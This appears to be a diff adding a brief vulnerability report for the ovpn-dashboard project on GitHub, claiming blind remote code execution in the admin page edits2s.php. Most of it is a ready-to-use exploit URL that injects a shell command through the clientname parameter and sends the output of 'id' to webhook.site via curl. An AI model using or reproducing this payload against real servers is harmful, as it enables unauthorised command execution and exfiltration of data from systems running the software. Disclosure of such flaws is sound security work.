@@ -1,0 +1,5 @@
+https://github.com/DennisSc/ovpn-dashboard
+
+Blind RCE on https://github.com/DennisSc/ovpn-dashboard/blob/master/var/www/html/admin/wizards/edits2s.php
+
+/admin/wizards/edits2s.php?clientname=$(curl -X POST https://webhook.site/ -d "$(id)")
